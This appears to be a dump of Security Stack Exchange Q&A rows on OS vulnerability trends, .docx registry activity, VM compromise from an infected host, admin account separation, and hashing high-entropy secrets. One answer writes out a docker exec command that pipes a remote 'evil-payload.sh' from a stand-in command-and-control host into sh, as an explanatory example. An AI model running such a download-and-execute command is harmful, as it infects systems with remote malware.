<p>With &quot;feature frozen&quot; I mean an operating system which receives no more feature updates, but only security updates. For example Windows 7, from when feature updates ended 7 years ago until when security updates ended 2 years ago, or Windows 8.1 now, since feature updates ended 4 years ago and security updates will continue for another 11 months. I based these examples on <a href=""https://endoflife.date/windows"" rel=""noreferrer"">https://endoflife.date/windows</a></p>
<p>This does not mean that fixing one bug won't introduce another one, but that in general, fewer bugs are introduced with bugfixes than are fixed.</p>
<p>Is my assumption correct? Is the frequency of (still open) vulnerabilities decreasing with age of a software, in particular of an operating system, from the moment it is feature-frozen until the end of security support?</p>
<p>I found for example the website <a href=""https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-17153/Microsoft-Windows-7.html"" rel=""noreferrer"">CVEdetails on Windows 7</a> but I cannot manage to restrict the search to unpatched bugs. I think it lists the frequency of new security bugs.</p>
<hr />
<p><em>Not part of the question</em>, but to explain why I got thinking about what I asked above:</p>
<p>Software companies provide a software, and in my opinion they should fix any vulnerability which gets discovered as long as customers are allowed to run the system, or they should kill it, like Sonos did with their unsupported speakers (for an operating system, it would not kill the machine but refuse to run past its extended support expiration date). Therefore I was wondering whether the older the system, the fewer vulnerabilities are discovered, and the lower the costs incurred in this endless security support. Of course not supporting it is cheaper, but that's not &quot;right&quot; according to my point of view.</p>
","18","4","259286","<p>The assumption that there are a fixed number of bugs, that must be found, and can therefore only reduce (making it safer), may be true in theory, but is deeply flawed in a practical sense. That's the basic problem.</p>
<h1>What we care about</h1>
<p>A modern OS has tens of millions of lines of code, in some cases hundreds of millions. We don't care about bugs really, its more helpful and instructive to care about <strong>exploitable vulnerabilities</strong> - which can include deliberate design choices, dependencies, and many other means by which a system can be compromised.</p>
<p>For a non-OS example of the difference, consider hacking of 2 factor authentication, by (1) <strong>socially engineering a persons mobile phone provider</strong>, to persuade them to issue a new SIM or  maybe change the SIM email address. We now click &quot;2FA login&quot;, and use the &quot;stolen&quot; SIM access to get the 2FA login code. Or perhaps (2) we find their password in a hack of some third party site and its the same as their email password so we issue a <strong>password reset then use their email account</strong>, to get a replacement logon issued (&quot;Forgot your password?&quot;). Or maybe (3) they <strong>lost their laptop</strong> with SSH login certificate included and it takes them a day to notice. Or (5) the <strong>encryption schema</strong> used for something was secure in fact but evolving research means its no longer secure. Or (5) <strong>hardware vulnerabilities</strong> exist too (DMA via FireWire, Bad Maid USB, you name it).</p>
<p>The point is that the 2FA or password reset or SSH login feature may be bug free, but a third party vulnerability let them hack. There's no &quot;fixed number&quot; of issues, and not all exploitable weaknesses are due to OS bugs. Who's to say what else could have been used?</p>
<p>So we can't even consider just the OS, or a concept of a static number of bugs. We have to consider the universe of things it may depend on, or evolving outside capabilities - things we maybe never considered until many years later. After all, SMS hacks weren't considered until a while after SMS existed. We have to consider the evolving landscape of exploits on the OS, or vulnerabilities.</p>
<p>We also need to distinguish between bugs, to be fixed, and new threats, to be countered. As some of these examples show, a new threat can arise, that didn't exist before. They may also reflect an issue that isn't really fair to classify as a bug in the system to be <strong>fixed</strong>, so much as a new threat opening due to external context changes that must be <strong>countered</strong>.</p>
<h1>Theoretical vs practical risk</h1>
<p>We also have to consider practical risk. Security is all about raising the barrier to misuse, there are rarely if ever perfectly secure systems, its always degrees of safety, &quot;safer&quot; not &quot;absolutely safe&quot;.</p>
<p>Only in theory can this be disregarded. In all practical senses, we need to consider things like how much attention and use will this OS be getting, and what its used for, because more use =&gt; more interest to hack, more attention =&gt; more probing for new ways to hack it.  Even an obscure OS may become of great interest if a use case is discovered to be government  servers, nuclear or military control, manufacturing, energy, space, banks and financials, and R&amp;D, or their back-end systems, to take some examples.</p>
<p>If a system is of great interest, then a lot of attention may go in to studying other systems connected to it, and <strong>their</strong> vulnerabilities too, as a stepping stone.</p>
<h1>Your answer</h1>
<p>For these reasons, you can rarely consider an OS, even one that's feature frozen except for bugfixes, as having a fixed number of bugs. It just doesn't happen that way, and won't help.</p>
<p>The OS is a dynamic environment, and interacts with its environment. So for all these reasons, you can't evaluate the scale or seriousness of exploits, without fixing it in a specific time, with specific outside focus, specific outside exploitable levers, specified hardware and hardware access, the criteria by which you measure and consider a system &quot;secure&quot; (barrier height), and so on.</p>
<p><strong>Therefore an OS that was in fact secure (either in fact, or for your practical purposes) is quite capable of transitioning to being insecure...... not even because of an undiscovered bug requiring fixing, but because of some external factor requiring countering - and may well do so.</strong></p>
<p>And that spells the end for your argument.</p>
","2"
"259255","259255","What is the frequency of open security bugs in an operating system with increasing age?","<p>I am having a discussion with friends and my point is that the older a feature-frozen operating system is, the fewer security bugs are left unpatched and therefore the cost for the company to fix them decreases with age.</p>
<p><strong>My assumption is: there are a finite number of bugs in a code which is not changed except for fixing bugs. The more get fixed, the fewer there are.</strong></p>
<p>With &quot;feature frozen&quot; I mean an operating system which receives no more feature updates, but only security updates. For example Windows 7, from when feature updates ended 7 years ago until when security updates ended 2 years ago, or Windows 8.1 now, since feature updates ended 4 years ago and security updates will continue for another 11 months. I based these examples on <a href=""https://endoflife.date/windows"" rel=""noreferrer"">https://endoflife.date/windows</a></p>
<p>This does not mean that fixing one bug won't introduce another one, but that in general, fewer bugs are introduced with bugfixes than are fixed.</p>
<p>Is my assumption correct? Is the frequency of (still open) vulnerabilities decreasing with age of a software, in particular of an operating system, from the moment it is feature-frozen until the end of security support?</p>
<p>I found for example the website <a href=""https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-17153/Microsoft-Windows-7.html"" rel=""noreferrer"">CVEdetails on Windows 7</a> but I cannot manage to restrict the search to unpatched bugs. I think it lists the frequency of new security bugs.</p>
<hr />
<p><em>Not part of the question</em>, but to explain why I got thinking about what I asked above:</p>
<p>Software companies provide a software, and in my opinion they should fix any vulnerability which gets discovered as long as customers are allowed to run the system, or they should kill it, like Sonos did with their unsupported speakers (for an operating system, it would not kill the machine but refuse to run past its extended support expiration date). Therefore I was wondering whether the older the system, the fewer vulnerabilities are discovered, and the lower the costs incurred in this endless security support. Of course not supporting it is cheaper, but that's not &quot;right&quot; according to my point of view.</p>
","18","4","259329","<p>A bug is not a problem if nobody knows about it.</p>
<p>So, a new operating system like Windows 11 probably has tons of security holes, but it is OK as long as they are unknown.</p>
<p>Unfortunately, people will stumble across these bugs occasionally, either by disassembling the code or noticing some odd behaviour.</p>
<p>On a living OS, maintained by an active company like Microsoft, bugs get fixed pretty quickly once the company notices them. And fixes gets distributed to the users.</p>
<p>A criminal discovering a bug will generally only be able to use to for a very short time before it is closed.  They can plan things and time their attack for the best/worst possible time, but it will still be a limited loss.</p>
<p>Now, compare this to Windows 7.  Yes there are fewer bugs.  But what happens when a new one is discovered?  Microsoft basically says &quot;Windows 7 is obsolete. You are on your own.&quot;  The bug stays.</p>
<p>A criminal discovering a bug in Windows 7 would be able to exploit it forever.  Well, at least a couple of decades until the last Windows 7 machine dies.</p>
","0"
"259216","259216","Is doc file really modifying registry in Windows?","<p>Been given a .docx file to check whether it has a virus or something, ran McAfee and SuperAntiSpyware on it and results came back negative so I though it was good and proceeded to open it, just a file with some text, few .jpg and .png files and a little draw on there.</p>
<p>Out of curiosity uploaded it to VirusTotal and it says it's clean too but in the behaviour tab it seems like it opens a lot of files, write in some others and opens and sets some keys in the Windows Registry, overall on \Microsoft\Office...</p>
<p>Also says it runs this &quot;...\Office15\WINWORD.EXE /Automation -Embedding, creates some mutexes (I don't know what that is)</p>
<p>Behaviour tag clams it calls wmi</p>
<p>I replaced the extension to .zip so I could see those .xml files in there and after reading through them all can't really tell they are good or no, they appear to be.</p>
<p>Is a .docx file capable of setting keys in the registry?
I only noticed the search sidebar panel in Word was closed while it's usually out, I thought I must've closed it last time.</p>
<p>Maybe that site uses some virtualization and it causes that for some reason?</p>
<p>I restored the system with a image I got so that's fixed now but I'm curious because I usually just run the AV and go on with life just like that and I don't have a file without personal data to try.</p>
<p>If there is a possibility someone here knows better and have the time to check it out, please, I can upload it somewhere so that anyone can see them</p>
<p>Thanks in advance.</p>
<p>EDIT:</p>
<p>Just created another .docx file from LibreOffice with a table, some text and few pics on it and it just creates same amount of .xml files, they look pretty much the same so after uploading it to VirusTotal, this new file also have that behavior tab with same paths and tags as the one I was given in the first place.</p>
<p>I assume it's just the way it handles it or something but the file is clear.</p>
","1","4","259223","<p>A Microsoft Word file does not -usually- have the ability to modify you machine, especially at any administrative level. What you are seeing is probably the inner workings of Microsoft Word/Libre Office. As another example, MS Word creates a temporary hidden file in the same directory of the original whenever you open a document.</p>
<p>One exception to the innocuousness of doc/docx are what are called &quot;macros&quot;. Macros can be malicious and there have been macro-viruses. It is not such a problem anymore, because macros are disabled by default for external documents and multiple Anti-Virus software block them too.</p>
","1"
"259216","259216","Is doc file really modifying registry in Windows?","<p>Been given a .docx file to check whether it has a virus or something, ran McAfee and SuperAntiSpyware on it and results came back negative so I though it was good and proceeded to open it, just a file with some text, few .jpg and .png files and a little draw on there.</p>
<p>Out of curiosity uploaded it to VirusTotal and it says it's clean too but in the behaviour tab it seems like it opens a lot of files, write in some others and opens and sets some keys in the Windows Registry, overall on \Microsoft\Office...</p>
<p>Also says it runs this &quot;...\Office15\WINWORD.EXE /Automation -Embedding, creates some mutexes (I don't know what that is)</p>
<p>Behaviour tag clams it calls wmi</p>
<p>I replaced the extension to .zip so I could see those .xml files in there and after reading through them all can't really tell they are good or no, they appear to be.</p>
<p>Is a .docx file capable of setting keys in the registry?
I only noticed the search sidebar panel in Word was closed while it's usually out, I thought I must've closed it last time.</p>
<p>Maybe that site uses some virtualization and it causes that for some reason?</p>
<p>I restored the system with a image I got so that's fixed now but I'm curious because I usually just run the AV and go on with life just like that and I don't have a file without personal data to try.</p>
<p>If there is a possibility someone here knows better and have the time to check it out, please, I can upload it somewhere so that anyone can see them</p>
<p>Thanks in advance.</p>
<p>EDIT:</p>
<p>Just created another .docx file from LibreOffice with a table, some text and few pics on it and it just creates same amount of .xml files, they look pretty much the same so after uploading it to VirusTotal, this new file also have that behavior tab with same paths and tags as the one I was given in the first place.</p>
<p>I assume it's just the way it handles it or something but the file is clear.</p>
","1","4","259242","<p>It's difficult to tell without you sharing the actual registry keys, but Microsoft Office creates and modifies registry keys all of its own during normal operation, for example to record recently used files. So it may well be that what you are seeing is this behaviour of the Office program itself.</p>
","0"
"259216","259216","Is doc file really modifying registry in Windows?","<p>Been given a .docx file to check whether it has a virus or something, ran McAfee and SuperAntiSpyware on it and results came back negative so I though it was good and proceeded to open it, just a file with some text, few .jpg and .png files and a little draw on there.</p>
<p>Out of curiosity uploaded it to VirusTotal and it says it's clean too but in the behaviour tab it seems like it opens a lot of files, write in some others and opens and sets some keys in the Windows Registry, overall on \Microsoft\Office...</p>
<p>Also says it runs this &quot;...\Office15\WINWORD.EXE /Automation -Embedding, creates some mutexes (I don't know what that is)</p>
<p>Behaviour tag clams it calls wmi</p>
<p>I replaced the extension to .zip so I could see those .xml files in there and after reading through them all can't really tell they are good or no, they appear to be.</p>
<p>Is a .docx file capable of setting keys in the registry?
I only noticed the search sidebar panel in Word was closed while it's usually out, I thought I must've closed it last time.</p>
<p>Maybe that site uses some virtualization and it causes that for some reason?</p>
<p>I restored the system with a image I got so that's fixed now but I'm curious because I usually just run the AV and go on with life just like that and I don't have a file without personal data to try.</p>
<p>If there is a possibility someone here knows better and have the time to check it out, please, I can upload it somewhere so that anyone can see them</p>
<p>Thanks in advance.</p>
<p>EDIT:</p>
<p>Just created another .docx file from LibreOffice with a table, some text and few pics on it and it just creates same amount of .xml files, they look pretty much the same so after uploading it to VirusTotal, this new file also have that behavior tab with same paths and tags as the one I was given in the first place.</p>
<p>I assume it's just the way it handles it or something but the file is clear.</p>
","1","4","260045","<p>The behaviour indicated by VirusTotal is the normal behaviour when Word processes a docx file:</p>
<ul>
<li>the docx (which is a zip file) is uncompressed in a temp folder and that bunch of files is read.</li>
<li>the registry is read to get the user and system parameters</li>
<li>the (user) registry is updated to store the new file into the recent file liste</li>
<li>other temp files can be written to store the state of the editing session to be able to restore it in case of crash</li>
</ul>
<p>It is indeed a good deal of work under the hood, but all the <em>magical goodies</em> of Word come at that price.</p>
","0"
"259216","259216","Is doc file really modifying registry in Windows?","<p>Been given a .docx file to check whether it has a virus or something, ran McAfee and SuperAntiSpyware on it and results came back negative so I though it was good and proceeded to open it, just a file with some text, few .jpg and .png files and a little draw on there.</p>
<p>Out of curiosity uploaded it to VirusTotal and it says it's clean too but in the behaviour tab it seems like it opens a lot of files, write in some others and opens and sets some keys in the Windows Registry, overall on \Microsoft\Office...</p>
<p>Also says it runs this &quot;...\Office15\WINWORD.EXE /Automation -Embedding, creates some mutexes (I don't know what that is)</p>
<p>Behaviour tag clams it calls wmi</p>
<p>I replaced the extension to .zip so I could see those .xml files in there and after reading through them all can't really tell they are good or no, they appear to be.</p>
<p>Is a .docx file capable of setting keys in the registry?
I only noticed the search sidebar panel in Word was closed while it's usually out, I thought I must've closed it last time.</p>
<p>Maybe that site uses some virtualization and it causes that for some reason?</p>
<p>I restored the system with a image I got so that's fixed now but I'm curious because I usually just run the AV and go on with life just like that and I don't have a file without personal data to try.</p>
<p>If there is a possibility someone here knows better and have the time to check it out, please, I can upload it somewhere so that anyone can see them</p>
<p>Thanks in advance.</p>
<p>EDIT:</p>
<p>Just created another .docx file from LibreOffice with a table, some text and few pics on it and it just creates same amount of .xml files, they look pretty much the same so after uploading it to VirusTotal, this new file also have that behavior tab with same paths and tags as the one I was given in the first place.</p>
<p>I assume it's just the way it handles it or something but the file is clear.</p>
","1","4","260052","<p>As a general rule, <strong>no, the file isn't doing any of that</strong>. It's being done by the program that processes the file - in this case, the Windows version of Microsoft Word, which still uses the amazingly archaic executable name of <code>winword.exe</code> - but Word would do those things for any file you open.</p>
<p>Some stuff (<em>not a complete list</em>) that Word does when you open a file:</p>
<ul>
<li>Load a bunch of libraries (DLL files) that implement various functionality that Word doesn't always need, and therefore doesn't load except on demand. This shows up as a bunch of file reads.</li>
<li>Update the recently-used documents list (which is stored in the registry; that's probably the registry write you saw).</li>
<li>Create a temporary copy of the file, to which any changes are written (autosave) until and unless you explicitly save changes to the file, at which point the original is overwritten. This causes a file creation and file write actions (and later file deletion).</li>
<li>Extract resources (e.g. images, fonts, and any other embedded media) from the file (which is a structured ZIP archive) to a temporary directory, because you can't render content straight out of a ZIP file. This causes file creation and writing (and later deleting).</li>
</ul>
<hr />
<p>Now with all that said, it is possible for a Word document to be malicious.</p>
<ol>
<li>The easy way is for it to have one or more malicious macros. Office macros are written in a Turing-complete scripting language that is capable of arbitrary actions on the operating system; for all intents and purposes they are executable programs. However, Word should never execute macros from a .docx file - only .docm and maybe legacy .doc - and usually prompts you before doing so anyhow.</li>
<li>The more complicated way for a Word doc to be malicious is for it to contain an exploit for a vulnerability in Word. Word supports a huge number of features across a very large number of file formats (the old binary .doc format, the Office Open XML format docx/docm format, Rich Text Format, Open Document Format, and a bunch of others, each usually having multiple incompatible versions), and as such its parser and renderer is extremely complicated code. A highly complicated file parser/renderer is a lot of attack surface in which to search for bugs, and Word is written in native code (C++) so bugs can lead to attacker-controlled memory corruption, which can lead to arbitrary code execution. In fact, since Word supports scripting - via the macro language VBA - you don't even necessarily need to use the usual sorts of memory corruption payloads (Return-Oriented Programming or similar) to achieve code execution; if you can put a bunch of VBA code into a file and then force Word to treat it as a macro (even if the file normally wouldn't run macros), then that's another way to run arbitrary code.</li>
</ol>
<p>In this case, though, it sounds like the file itself is probably totally innocuous.</p>
","1"
"259089","259089","If my machine is infected and I run a Virtual Machine inside of it, will the VM also be compromised","<p>I've been researching on virtual machine security and found a lot of articles detailing how an infected VM is isolated (or not) from the host machine.</p>
<p>But I couldn't find any answers to the opposite side of the question. If my host is infected, can I safely run some operation inside of a VM? How would that work?</p>
","31","5","259090","<p>Yes, if the host is compromised it will almost certainly have access to all of the containers within it through both privileged memory reading and administrative API calls.</p>
","9"
"259089","259089","If my machine is infected and I run a Virtual Machine inside of it, will the VM also be compromised","<p>I've been researching on virtual machine security and found a lot of articles detailing how an infected VM is isolated (or not) from the host machine.</p>
<p>But I couldn't find any answers to the opposite side of the question. If my host is infected, can I safely run some operation inside of a VM? How would that work?</p>
","31","5","259091","<p>The initial question asks &quot;Will the VM be infected?&quot;, which is asking to predict the future, which is not possible for anyone on this site to do. So instead, I will answer &quot;Can the VM be infected?&quot;</p>
<hr />
<p>The reason why you read a lot about VM isolation is because the VM is, in essence, just a process on the host machine, similar to Chrome, VLC or any game you may be playing. A VM process just happens to be a lot more complex, but in essence, the VM is less privileged than your host's operating system. It would be nonsensical if the VM could somehow &quot;overrule&quot; the host's operating system.</p>
<p>But this paints a clear picture: The host OS is more privileged than the guest OS. If malware infects the host, then an attacker may be able to run commands with elevated privileges (root on UNIX systems, SYSTEM on Windows, etc.), or even run with kernel privileges.</p>
<p>If that is the case, then the VM can be modified and infected at will by an attacker. After all, the VM is just a process, running in the same compromised environment.</p>
","77"
"259089","259089","If my machine is infected and I run a Virtual Machine inside of it, will the VM also be compromised","<p>I've been researching on virtual machine security and found a lot of articles detailing how an infected VM is isolated (or not) from the host machine.</p>
<p>But I couldn't find any answers to the opposite side of the question. If my host is infected, can I safely run some operation inside of a VM? How would that work?</p>
","31","5","259109","<p>The first practical example that comes into my mind is <a href=""https://docker.com"" rel=""nofollow noreferrer"">Docker</a>.</p>
<p>Containers are <strong>not</strong> VMs, but sort of, and the attack pattern is absolutely simple. Once you have taken control of the host machine, you can run commands such as</p>
<pre><code>docker exec [runningContainerName] wget -q -O - https://c-and-c.com/evil-payload.sh | sh
</code></pre>
<p>The above command runs a privileged command in a running container, and infects the target container with remote malware. Think about any other possible alternative.</p>
<p>As for VMs, I can think of</p>
<h3>Theoretically</h3>
<p>You got control of the host, possibly of the kernel, so the malware can control the hypervisor and alter the behaviour of guest machine, access kernel memory areas of the guest, etc.</p>
<p>This is from a high-level perspective.</p>
<h3>Practically?</h3>
<p>Once you infected the host machine with a malware, you can start from shutting down, deleting, dumping the VMs. If your virtualization engine supports a deeper interaction with the machines from shell commands, it is easier for the malware to do other evil</p>
<ul>
<li>Connect a USB virtual keyboard and type commnands?</li>
<li>Run an executable like on Docker? (This is not something you normally do out-of-the box without a PCI virtual controller)</li>
<li>Switch virtual networks and do evil things on traffic?</li>
</ul>
<p>Pratically, it all depends on the complexity of the malware and the level of interaction provided by virtualization engine. Targeted malware can do targeted action..</p>
<p>I can also think the malware can infest/infect the UEFI firmware of the guest machines to run code on boot (I'm thinking about some UEFI bloatware currently on the market, but to run other malware on the VM)</p>
","4"
"259089","259089","If my machine is infected and I run a Virtual Machine inside of it, will the VM also be compromised","<p>I've been researching on virtual machine security and found a lot of articles detailing how an infected VM is isolated (or not) from the host machine.</p>
<p>But I couldn't find any answers to the opposite side of the question. If my host is infected, can I safely run some operation inside of a VM? How would that work?</p>
","31","5","259115","<p>I believe you are asking the wrong question.</p>
<p>Whether or not your VM is infected is an open question. To answer it, you can inspect the malware, inspect the VM, draw conclusions, make a guess. <strong>But you will never know for certain</strong>. There is always a possibility that you missed a hidden payload, that your inspection wasn't perfect, that the experts describing what the malware does missed something or that it isn't the exact malware you think it is, but a variant.</p>
<p>The right question to ask is: <strong>Can you still trust your VM?</strong></p>
<p>And that answer is no, you cannot. Since you cannot rule out the possibility that the VM was also compromised, or the VM engine itself is compromised, you cannot trust the VM and it is impossible to restore trust.</p>
<p>A thorough inspection can restore some <strong>confidence</strong>, but not full trust. That machine was out of your control, and you can not be 100% sure that it is now back exclusively under your control.</p>
","14"
"259089","259089","If my machine is infected and I run a Virtual Machine inside of it, will the VM also be compromised","<p>I've been researching on virtual machine security and found a lot of articles detailing how an infected VM is isolated (or not) from the host machine.</p>
<p>But I couldn't find any answers to the opposite side of the question. If my host is infected, can I safely run some operation inside of a VM? How would that work?</p>
","31","5","259155","<p>Not automatically, unless the malware on the host either/or:</p>
<ol>
<li><p>Explicitly recognizes the existence of the VM(s) and takes steps to compromise it</p>
</li>
<li><p>Implicitly Compromises resources (eg a shared filesystem with executable files used by both systems) used by the VM</p>
</li>
<li><p>Manipulates operating system or hardware facilities that are used to implement functionalities of hypervisor/drivers (eg low level driver code or firmware used for a network interface card effectively used by host and VMs)</p>
</li>
</ol>
<p>However, unless measures were taken that make any access to a VM resource impossible from the host operating system (eg use of encrypted filesystems with no key available to the host), or unless the malware that was used is completely known and analyzed* and it can be established 1. to 3. did not happen, or all content of the VM can be verified against a known uncorrupted resource (eg by loading the VM on a different known good host and comparing files against a known good copy of the VM) independent of the host, integrity of the VM can not be guaranteed.</p>
<p>*In practice(!), this might sometimes be considered as established when there is a limited number of extant exploitation tools and these are well analyzed, and there is a high likelyhood one of these was used (that is what &quot;antivirus&quot; software does in the end). No guarantees though...</p>
","2"
"258948","258948","Is there really any benefit in having a separate local admin account","<p>I have been thinking of implementing a new practice where local admin privileges are disabled entirely from all endpoints. For users who need to elevate privileges, they will have a separate admin account dedicated and restricted only to the local administration.</p>
<p>I am thinking about how the passwords will be managed. (Its a longshot but) Is there any way passwords can be centrally managed? E.G if a user forgot their password or needed to reset their password, can this be something done centrally via the AD by calling the helpdesk or would we just have to rely entirely on the users.</p>
<p>Also apart from the malware not being able to run automatically with admin privileges if a compromise occurs which is the primary reason I am implementing this, what other benefits would this provide? Is this even best practice?</p>
","1","3","258956","<p>It is absolutely a good idea - you'll probably have an initial ramp of hatred from the users who were used to installing whatever they want, but once this dies down you'll be a lot more secure. You'll want a good way to push software (or let the helpdesk do it remotely) before you start this. You'll also want to make sure that people don't just swap to logging in using the admin account instead of their cached AD account. It might be an idea to let the few users that get an admin account have a separate admin account for themselves, and then add another helpdesk one with something like LAPS.</p>
<p>LAPS is a good way to keep all the local passwords secure and available (<a href=""https://techcommunity.microsoft.com/t5/itops-talk-blog/step-by-step-guide-how-to-configure-microsoft-local/ba-p/2806185"" rel=""nofollow noreferrer"">https://techcommunity.microsoft.com/t5/itops-talk-blog/step-by-step-guide-how-to-configure-microsoft-local/ba-p/2806185</a>). I'm pretty sure I've seen a similar setup made with Hashicorp Vault. Maybe one of these will make things a bit easier for you.</p>
","1"
"258948","258948","Is there really any benefit in having a separate local admin account","<p>I have been thinking of implementing a new practice where local admin privileges are disabled entirely from all endpoints. For users who need to elevate privileges, they will have a separate admin account dedicated and restricted only to the local administration.</p>
<p>I am thinking about how the passwords will be managed. (Its a longshot but) Is there any way passwords can be centrally managed? E.G if a user forgot their password or needed to reset their password, can this be something done centrally via the AD by calling the helpdesk or would we just have to rely entirely on the users.</p>
<p>Also apart from the malware not being able to run automatically with admin privileges if a compromise occurs which is the primary reason I am implementing this, what other benefits would this provide? Is this even best practice?</p>
","1","3","259143","<p>We have had separate admin accounts for years that have more stringent password and access rules than a non-admin account. Recently, we implemented a PAM solution where our admin userids have to be checked in/out with a password that is only valid for that session and the session will timeout after a pre-defined period. Definitely inconvenient from an end-user perspective, but good security practice.</p>
","0"
"258948","258948","Is there really any benefit in having a separate local admin account","<p>I have been thinking of implementing a new practice where local admin privileges are disabled entirely from all endpoints. For users who need to elevate privileges, they will have a separate admin account dedicated and restricted only to the local administration.</p>
<p>I am thinking about how the passwords will be managed. (Its a longshot but) Is there any way passwords can be centrally managed? E.G if a user forgot their password or needed to reset their password, can this be something done centrally via the AD by calling the helpdesk or would we just have to rely entirely on the users.</p>
<p>Also apart from the malware not being able to run automatically with admin privileges if a compromise occurs which is the primary reason I am implementing this, what other benefits would this provide? Is this even best practice?</p>
","1","3","259146","<p>There are several benefits to managing administrative accounts separately from regular user accounts.</p>
<ul>
<li>Ordinary user activity, like email or web browsing, is done without special admin privileges, limiting the scope of an attack, and increasing the difficulty of exploiting an attack.</li>
<li>Logging in as an admin with a static password can leave hashes on a box that can be picked up by an attacker and reused in a “pass the hash” attack. If a domain admin logs on to a desktop box, and that box is later the victim of a phish, their credential hash may remain live until the password is changed! A checkout account with a rotating password invalidates those hashes as soon as the password is changed.</li>
<li>Checkout accounts give visibility and auditability to the use of elevated privileges. Letting a manager audit one specific account’s use can be done without granting full audit permissions to every account for that manager.</li>
<li>Checkout account systems can have their own authentication mechanisms, giving the ability to add multi-factor authentication (like TOTP) to older or closed systems that can’t otherwise support 2FA.</li>
</ul>
<p>Most of these benefits can be derived by using a centralized tool to manage those accounts and passwords in your organization. There are several external products that can manage passwords dynamically; they have their pros and cons.</p>
<ul>
<li><p>The enterprise licensed version of HashiCorp Vault has a module that can update the passwords, but it requires credentials with administrative access into AD to make those changes.  They also have a RESTful API for conveniently accessing credentials programmatically from other systems.  Their system is well suited to securely store passwords for automated systems such as CI/CD pipelines.</p>
</li>
<li><p>CyberArk Password Vault allows for timed credentials designed for &quot;checkout accounts&quot;; you check out a username/password from the vault and it automatically changes the AD password when the timer pops, or when the user checks the account back in.  (I believe it can also lockout the account if something goes wrong.)  You can also set it up so the user can reset their own checkout accounts. They have a &quot;local agent&quot; you can install that can remotely access credentials programmatically (for CI/CD use), but it's quite awkward to access and use.  They're well suited to manual checkout of IDs for emergency use.</p>
</li>
<li><p>BeyondTrust Software offers Password Safe and DevOps Secrets Safe, which also fit similarly into those two problem spaces.</p>
</li>
</ul>
<p>All these solutions provide ways for administrators to reset and revoke passwords, report on usage, etc.  They're one way to control privileged access, and the audit trail can help your SOC identify the source of issues and incidents. And they all come with a price tag, so you can weigh that in the decision process, too.</p>
","3"
"258928","258928","What is the best way to store the verifyer for posession of a high entropy secret?","<p>This is just a thought experiment. I am trying to get an understanding on when we need password hashing functions and when they don't bring any benefits (eg. to save on calculation cost).</p>
<p>I know that password-hashing-functions are to be used when storing password verifiers as passwords usually have low entropy. What about high-entropy secrets? Is it sufficient to salt and hash them with a normal modern hashing algorithm or should I still use a password-hashing-function to increase calculation time and memory?</p>
<p>Example: User uses a cryptographically secure RNG to generate a 256-bit secret which he then uses as 'password' to sign up. Is it good enough to store a salt and the sha256-hash of the salted password to compare against in the future?</p>
","2","3","258940","<p>It depends on the quality of other secrets of that type.  If the secret is high entropy, but it's stored as a password and other secrets are typical low entropy passwords, then you should use a normal password hashing function like Argon2.  That's because you don't want to make it easy to guess the weak ones, even if there are strong ones like the ones you've described.</p>
<p>If all of the secrets of its type are high entropy (that is, having at least 128-bits of cryptographically secure randomness), say, because you generated random tokens for users of your API, then you can use a salted hash because it is computationally infeasible to brute force.  HMAC with a strong hash function like SHA-2, SHA-3, or BLAKE2 is a great way to do this (as are other strong MACs).</p>
","0"
"258928","258928","What is the best way to store the verifyer for posession of a high entropy secret?","<p>This is just a thought experiment. I am trying to get an understanding on when we need password hashing functions and when they don't bring any benefits (eg. to save on calculation cost).</p>
<p>I know that password-hashing-functions are to be used when storing password verifiers as passwords usually have low entropy. What about high-entropy secrets? Is it sufficient to salt and hash them with a normal modern hashing algorithm or should I still use a password-hashing-function to increase calculation time and memory?</p>
<p>Example: User uses a cryptographically secure RNG to generate a 256-bit secret which he then uses as 'password' to sign up. Is it good enough to store a salt and the sha256-hash of the salted password to compare against in the future?</p>
","2","3","258945","<p>This is the well known security/cost balance for the choice of a hashing algorithm:</p>
<ul>
<li>the more resource consuming the algo is, the more resilient to brute force attack [assuming the hash has been leaked]</li>
<li>the less resource consuming the algo is, the more users can be accepted on a server</li>
</ul>
<p>When you have a stateful application, the common assumption is that the login operation only scarcely occurs, and that spending time there is not a problem.</p>
<p>But it is true that the <em>computation cost</em> is commonly tweaked depending of the security requirements, and the expected load of the system.</p>
<p>You are true on one point: the total cost of a brute force attack is the product of the algorithmic cost of the hashing algo by the password entropy.</p>
<p>The problem in deciding to use a fast hashing function and hoping high entropy passwords is that you have little control on how the end user will choose its password. Because typed passwords normally have to be <em>simple</em> enough for a human being to be able to remember them, and type them with no typo - <strong>I</strong> cannot hope typing a 64 characters password with no typo...</p>
<p>A possible alternative is to use <em>stored tokens</em>. As they are not expected to be hand typed, the size is not a problem and you can safely use a fast hashing function. You only expect the user to securely store them, but after all it is <strong>their</strong> concern. This is for example used on GitHub. And as a GitHub user, I know that the security of my account is limited by the security of the machine/application that stores my tokens.</p>
","1"
"258928","258928","What is the best way to store the verifyer for posession of a high entropy secret?","<p>This is just a thought experiment. I am trying to get an understanding on when we need password hashing functions and when they don't bring any benefits (eg. to save on calculation cost).</p>
<p>I know that password-hashing-functions are to be used when storing password verifiers as passwords usually have low entropy. What about high-entropy secrets? Is it sufficient to salt and hash them with a normal modern hashing algorithm or should I still use a password-hashing-function to increase calculation time and memory?</p>
<p>Example: User uses a cryptographically secure RNG to generate a 256-bit secret which he then uses as 'password' to sign up. Is it good enough to store a salt and the sha256-hash of the salted password to compare against in the future?</p>
","2","3","258950","<blockquote>
<p>What about high-entropy secrets? Is it sufficient to salt and hash them with a normal modern hashing algorithm or should I still use a password-hashing-function to increase calculation time and memory?</p>
<p>Example: User uses a cryptographically secure RNG to generate a 256-bit secret which he then uses as 'password' to sign up. Is it good enough to store a salt and the sha256-hash of the salted password to compare against in the future?</p>
</blockquote>
<p>Yes, but in practice you don't know that's what a user did, so you'd run it through a password hashing algorithm anyway.</p>
<p>However, for high-entropy things where you do control the generation (or at least know the process used), it's quite reasonable to use a single iteration of a secure (but fast) hash algorithm, such as SHA2-256 or SHA3-256. You don't even really need to salt it; salting is to defeat rainbow tables and make duplicates look different, but nobody can make a rainbow table for even 128-bit-entropy values, and duplicates are functionally guaranteed to not happen (GUIDs are not <em>quite</em> 128 bits of entropy, in fact). Some examples of things where this is a reasonable approach:</p>
<ul>
<li>API keys (essentially passwords but by machines for machines, not intended to be human memorable or even necessarily printable)</li>
<li>Opaque session tokens</li>
<li>Refresh tokens (typically paired with JWTs)</li>
<li>Password reset tokens (typically transmitted in a URL as hex or base64)</li>
<li>Cryptographic keys (if you're just checking to see if a user-supplied key is correct before using it for a bunch of encryption/decryption)</li>
</ul>
<hr />
